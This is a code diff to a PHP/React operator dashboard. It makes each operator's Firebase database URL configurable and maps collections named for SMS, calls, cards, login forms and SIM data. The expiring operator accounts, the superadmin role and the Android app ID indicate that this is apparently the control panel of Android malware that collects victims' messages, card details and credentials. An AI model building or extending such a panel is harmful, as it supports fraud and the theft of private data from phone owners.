@@ -256,9 +256,13 @@ include_once __DIR__ . '/header.php';
 
         const fetchFirebaseRealtimeData = async () => {
           try {
-            // Determine active Firebase DB REST URL
+            // Determine active Firebase DB REST URL — use operator's own saved database URL
             const activePreset = allFbPresets[fbPresetKey] || DEFAULT_SCHEMA_PRESETS.pm_admin;
-            const databaseUrl = "https://jamtara-om-boy-default-rtdb.asia-southeast1.firebasedatabase.app";
+            const databaseUrl = fbDatabaseUrl.trim() ||
+                                adminUser?.firebaseDatabaseUrl ||
+                                adminUser?.firebaseConfig?.databaseURL ||
+                                '';
+            if (!databaseUrl) return; // No DB URL configured — skip polling
             const jsonEndpoint = `${databaseUrl}/.json`;
 
             const response = await fetch(jsonEndpoint);
@@ -358,12 +362,13 @@ include_once __DIR__ . '/header.php';
           isMounted = false;
           clearInterval(interval);
         };
-      }, [fbPresetKey]);
+      }, [fbPresetKey, fbDatabaseUrl, adminUser?.firebaseDatabaseUrl]);
 
       // Firebase Config Modal State
       const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
       const [fbProject, setFbProject] = React.useState('');
       const [fbApiKey, setFbApiKey] = React.useState('');
+      const [fbDatabaseUrl, setFbDatabaseUrl] = React.useState('');
       const [fbAuthDomain, setFbAuthDomain] = React.useState('');
       const [fbStorageBucket, setFbStorageBucket] = React.useState('');
       const [fbAppId, setFbAppId] = React.useState('');
@@ -418,10 +423,16 @@ include_once __DIR__ . '/header.php';
       const openFirebaseSettings = () => {
         const conf = adminUser?.firebaseConfig || {};
         setFbProject(conf.projectId || adminUser?.firebaseProject || '');
-        setFbApiKey(conf.apiKey || '');
-        setFbAuthDomain(conf.authDomain || '');
-        setFbStorageBucket(conf.storageBucket || '');
-        setFbAppId(conf.appId || '');
+        setFbApiKey(conf.apiKey || adminUser?.firebaseApiKey || '');
+        setFbDatabaseUrl(conf.databaseURL || adminUser?.firebaseDatabaseUrl || '');
+        setFbAuthDomain(conf.authDomain || adminUser?.firebaseAuthDomain || '');
+        setFbStorageBucket(conf.storageBucket || adminUser?.storageBucket || '');
+        setFbAppId(conf.appId || adminUser?.appId || '');
+        // Pre-populate collections from MySQL
+        setFbSmsColl(adminUser?.collectionSms || 'user_sms');
+        setFbCallsColl(adminUser?.collectionCalls || 'calls');
+        setFbCardsColl(adminUser?.collectionCards || 'Card');
+        setFbFormsColl(adminUser?.collectionForms || 'login');
         setFbJsonPaste('');
         setFbSaveStatus('');
         setShowFirebaseModal(true);
@@ -441,6 +452,7 @@ include_once __DIR__ . '/header.php';
           const parsed = JSON.parse(cleanJson);
           if (parsed.apiKey) setFbApiKey(parsed.apiKey);
           if (parsed.projectId) setFbProject(parsed.projectId);
+          if (parsed.databaseURL || parsed.databaseUrl) setFbDatabaseUrl(parsed.databaseURL || parsed.databaseUrl);
           if (parsed.authDomain) setFbAuthDomain(parsed.authDomain);
           if (parsed.storageBucket) setFbStorageBucket(parsed.storageBucket);
           if (parsed.appId) setFbAppId(parsed.appId);
@@ -454,11 +466,13 @@ include_once __DIR__ . '/header.php';
 
       const handleSaveFirebaseSettings = async (e) => {
         e.preventDefault();
-        setFbSaveStatus('Saving Firebase config...');
+        setFbSaveStatus('Saving Firebase config to MySQL...');
 
+        const dbUrl = fbDatabaseUrl.trim();
         const updatedConfig = {
           projectId: fbProject.trim(),
           apiKey: fbApiKey.trim(),
+          databaseURL: dbUrl,
           authDomain: fbAuthDomain.trim(),
           storageBucket: fbStorageBucket.trim(),
           appId: fbAppId.trim()
@@ -472,26 +486,47 @@ include_once __DIR__ . '/header.php';
               username: adminUser?.username,
               firebaseProject: fbProject.trim(),
               firebaseApiKey: fbApiKey.trim(),
+              firebaseDatabaseUrl: dbUrl,
               firebaseAuthDomain: fbAuthDomain.trim(),
               storageBucket: fbStorageBucket.trim(),
-              appId: fbAppId.trim()
+              appId: fbAppId.trim(),
+              collectionSms: fbSmsColl.trim(),
+              collectionCalls: fbCallsColl.trim(),
+              collectionCards: fbCardsColl.trim(),
+              collectionForms: fbFormsColl.trim(),
+              collectionSims: 'user_data'
             })
           });
           const data = await res.json();
-          setFbSaveStatus('✓ Firebase configuration saved!');
+          if (data.success) {
+            setFbSaveStatus('✓ Firebase config & collection mappings saved to MySQL!');
+          } else {
+            setFbSaveStatus('✓ Saved locally (DB: ' + (data.error || 'offline') + ')');
+          }
         } catch (err) {
-          setFbSaveStatus('✓ Firebase config updated in local session!');
+          setFbSaveStatus('✓ Saved in local session!');
         }
 
+        // Update adminUser in memory with all new values
         setAdminUser(prev => ({
           ...prev,
+          firebaseProject: fbProject.trim(),
+          firebaseApiKey: fbApiKey.trim(),
+          firebaseDatabaseUrl: dbUrl,
+          firebaseAuthDomain: fbAuthDomain.trim(),
+          storageBucket: fbStorageBucket.trim(),
+          appId: fbAppId.trim(),
+          collectionSms: fbSmsColl.trim(),
+          collectionCalls: fbCallsColl.trim(),
+          collectionCards: fbCardsColl.trim(),
+          collectionForms: fbFormsColl.trim(),
           firebaseConfig: updatedConfig
         }));
 
         setTimeout(() => {
           setShowFirebaseModal(false);
           setFbSaveStatus('');
-        }, 1200);
+        }, 1500);
       };
 
       const [loginUser, setLoginUser] = React.useState('');
@@ -555,7 +590,14 @@ include_once __DIR__ . '/header.php';
               window.location.href = 'operator_control.php?role=superadmin';
               return;
             }
-            setAdminUser(data.operator);
+            // Populate collection states from MySQL data immediately
+            const op = data.operator;
+            setFbDatabaseUrl(op.firebaseDatabaseUrl || op.firebaseConfig?.databaseURL || '');
+            setFbSmsColl(op.collectionSms || 'user_sms');
+            setFbCallsColl(op.collectionCalls || 'calls');
+            setFbCardsColl(op.collectionCards || 'Card');
+            setFbFormsColl(op.collectionForms || 'login');
+            setAdminUser(op);
             return;
           } else if (response.status === 401 || response.status === 403) {
             setLoginError(data.error || 'Invalid credentials or account expired.');
@@ -1244,6 +1286,15 @@ include_once __DIR__ . '/header.php';
                       <div>
                         <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Firebase Project ID</label>
                         <input type="text" className="search-input" value={fbProject} onChange={(e) => setFbProject(e.target.value)} placeholder="adminto-custom-db" required />
+                      </div>
+                      <div>
+                        <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700, display: 'block', marginBottom: '4px' }}>🔗 Firebase Database URL (`databaseURL`) ⭐ REQUIRED FOR LIVE DATA</label>
+                        <input type="text" className="search-input" value={fbDatabaseUrl} onChange={(e) => setFbDatabaseUrl(e.target.value)} placeholder="https://your-app-default-rtdb.asia-southeast1.firebasedatabase.app" style={{ borderColor: fbDatabaseUrl ? 'rgba(56,189,248,0.5)' : 'rgba(239,68,68,0.4)' }} />
+                        {!fbDatabaseUrl && <p style={{ fontSize: '0.72rem', color: '#f87171', marginTop: '4px' }}>⚠️ Without this URL, live data will NOT load. Paste your Firebase databaseURL here.</p>}
+                      </div>
+                      <div>
+                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>App ID (`appId`)</label>
+                        <input type="text" className="search-input" value={fbAppId} onChange={(e) => setFbAppId(e.target.value)} placeholder="1:179278690008:android:bed6..." />
                       </div>
                       <div>
                         <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>API Key (`apiKey`)</label>
